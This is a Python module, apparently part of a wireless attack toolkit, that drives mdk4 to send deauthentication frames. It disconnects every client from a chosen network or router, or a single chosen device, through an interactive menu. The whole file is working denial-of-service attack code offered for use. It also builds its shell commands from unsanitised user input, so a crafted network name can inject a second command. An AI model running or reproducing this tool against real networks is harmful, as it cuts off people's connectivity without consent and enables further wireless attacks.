"""
Deauthentication Attack - WiFi Client Disconnection Tool

This module performs wireless deauthentication attacks targeting specific
networks or devices. Uses mdk4 for packet injection.
"""

import subprocess
import time
from ui import (cprint, iprint, wprint, eprint, sprint, cinput, 
                   RED, GREEN, CYAN, YELLOW, MAGENTA, WHITE, 
                   RESET, LIGHT_CYAN, clear)


class DeauthAttack:
    """
    Wireless deauthentication attack targeting networks and devices.
    Can disconnect clients from specific networks or routers.
    """
    
    def __init__(self, interface):
        """
        Initialize the deauth attack tool.
        
        Args:
            interface (str): WiFi interface in monitor mode (e.g., "wlan1mon")
        """
        self.interface = interface
        self.process = None
    
    def verify_monitor_mode(self):
        """
        Verify that the interface is in monitor mode.
        
        Returns:
            bool: True if interface is in monitor mode, False otherwise
        """
        try:
            result = subprocess.run(
                ["iwconfig", self.interface],
                capture_output=True,
                text=True,
                timeout=5
            )
            return "Monitor" in result.stdout
        except Exception as e:
            eprint(f"Error checking monitor mode: {e}")
            return False
    
    def attack_by_ssid(self, ssid):
        """
        Perform deauth attack targeting a specific network SSID.
        Disconnects all devices connected to that network.
        
        Args:
            ssid (str): Network name to target
        """
        try:
            iprint(f"Targeting network: {ssid}")
            iprint("Starting deauthentication frames (Ctrl+C to stop)\n")
            time.sleep(1)
            
            cmd = f"mdk4 {self.interface} d -E {ssid}"
            
            self.process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Monitor output
            while self.process:
                try:
                    output = self.process.stdout.readline()
                    if output:
                        cprint(output.rstrip(), CYAN)
                    
                    if self.process.poll() is not None:
                        break
                except KeyboardInterrupt:
                    self.stop_attack()
                    break
            
            sprint("Attack stopped.")
            
        except FileNotFoundError:
            eprint("mdk4 not found. Install aircrack-ng: sudo apt-get install aircrack-ng")
        except Exception as e:
            eprint(f"Error during attack: {e}")
        finally:
            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=2)
                except:
                    self.process.kill()
    
    def attack_by_router(self, bssid):
        """
        Perform deauth attack targeting a specific router by MAC address.
        Disconnects all devices connected to that router.
        
        Args:
            bssid (str): Router MAC address (e.g., "00:11:22:33:44:55")
        """
        try:
            iprint(f"Targeting router: {bssid}")
            iprint("Sending deauthentication frames (Ctrl+C to stop)\n")
            time.sleep(1)
            
            cmd = f"mdk4 {self.interface} d -B {bssid}"
            
            self.process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Monitor output
            while self.process:
                try:
                    output = self.process.stdout.readline()
                    if output:
                        cprint(output.rstrip(), CYAN)
                    
                    if self.process.poll() is not None:
                        break
                except KeyboardInterrupt:
                    self.stop_attack()
                    break
            
            sprint("Attack stopped.")
            
        except FileNotFoundError:
            eprint("mdk4 not found. Install aircrack-ng: sudo apt-get install aircrack-ng")
        except Exception as e:
            eprint(f"Error during attack: {e}")
        finally:
            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=2)
                except:
                    self.process.kill()
    
    def attack_by_device(self, target_mac, router_mac):
        """
        Perform deauth attack targeting a specific client device.
        Disconnects ONE device from a specific network.
        
        Args:
            target_mac (str): Device MAC address to disconnect
            router_mac (str): Router MAC address the device is connected to
        """
        try:
            iprint(f"Target device: {target_mac}")
            iprint(f"Router (BSSID): {router_mac}")
            iprint("Sending targeted deauthentication (Ctrl+C to stop)\n")
            time.sleep(1)
            
            cmd = f"mdk4 {self.interface} d -B {router_mac} -S {target_mac}"
            
            self.process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1
            )
            
            # Monitor output
            while self.process:
                try:
                    output = self.process.stdout.readline()
                    if output:
                        cprint(output.rstrip(), CYAN)
                    
                    if self.process.poll() is not None:
                        break
                except KeyboardInterrupt:
                    self.stop_attack()
                    break
            
            sprint("Attack stopped.")
            
        except FileNotFoundError:
            eprint("mdk4 not found. Install aircrack-ng: sudo apt-get install aircrack-ng")
        except Exception as e:
            eprint(f"Error during attack: {e}")
        finally:
            if self.process:
                try:
                    self.process.terminate()
                    self.process.wait(timeout=2)
                except:
                    self.process.kill()
    
    def stop_attack(self):
        """Terminate the attack process."""
        if self.process:
            try:
                self.process.terminate()
                self.process.wait(timeout=2)
            except:
                self.process.kill()
    
    def display_target_menu(self):
        """Display target selection menu."""
        print()
        cprint("╔════════════════════════════════════════════════════════╗", CYAN)
        cprint("║              SELECT ATTACK TARGET TYPE                 ║", CYAN)
        cprint("╠════════════════════════════════════════════════════════╣", CYAN)
        cprint("║                                                        ║", CYAN)
        cprint("║  1) Network (ESSID)                                    ║", LIGHT_CYAN)
        cprint("║     Disconnect all devices from a specific network     ║", WHITE)
        cprint("║                                                        ║", CYAN)
        cprint("║  2) Router (BSSID)                                     ║", LIGHT_CYAN)
        cprint("║     Disconnect all devices from a specific router      ║", WHITE)
        cprint("║                                                        ║", CYAN)
        cprint("║  3) Device (Station MAC)                               ║", LIGHT_CYAN)
        cprint("║     Disconnect a single device from a network          ║", WHITE)
        cprint("║                                                        ║", CYAN)
        cprint("║  0) Cancel                                             ║", YELLOW)
        cprint("║                                                        ║", CYAN)
        cprint("╚════════════════════════════════════════════════════════╝", CYAN)
    
    def run_interactive(self):
        """Interactive deauth attack menu."""
        while True:
            clear()
            cprint("╔════════════════════════════════════════════════════════╗", MAGENTA)
            cprint("║               DEAUTHENTICATION ATTACK                  ║", MAGENTA)
            cprint("╚════════════════════════════════════════════════════════╝", MAGENTA)
            print()
            cprint(f"Interface: {self.interface}", LIGHT_CYAN)
            cprint("Monitor Mode: ", LIGHT_CYAN, end='')
            sprint("Verified" if self.verify_monitor_mode() else "Not detected")
            print()
            
            self.display_target_menu()
            
            choice = cinput("Select target type", LIGHT_CYAN)
            
            if choice == "0":
                break
            elif choice == "1":
                clear()
                ssid = cinput("Enter network name (ESSID)", LIGHT_CYAN)
                if ssid:
                    self.attack_by_ssid(ssid)
                else:
                    wprint("ESSID cannot be empty")
            elif choice == "2":
                clear()
                bssid = cinput("Enter router MAC address (BSSID)", LIGHT_CYAN)
                if bssid:
                    self.attack_by_router(bssid)
                else:
                    wprint("BSSID cannot be empty")
            elif choice == "3":
                clear()
                device_mac = cinput("Enter device MAC address to disconnect", LIGHT_CYAN)
                router_mac = cinput("Enter router MAC address (BSSID)", LIGHT_CYAN)
                if device_mac and router_mac:
                    self.attack_by_device(device_mac, router_mac)
                else:
                    wprint("Both MAC addresses required")
            else:
                wprint(f"Invalid option: {choice}")
                time.sleep(1)
            
            if choice in ["1", "2", "3"]:
                input(f"\n{CYAN}Press Enter to continue...{RESET}")
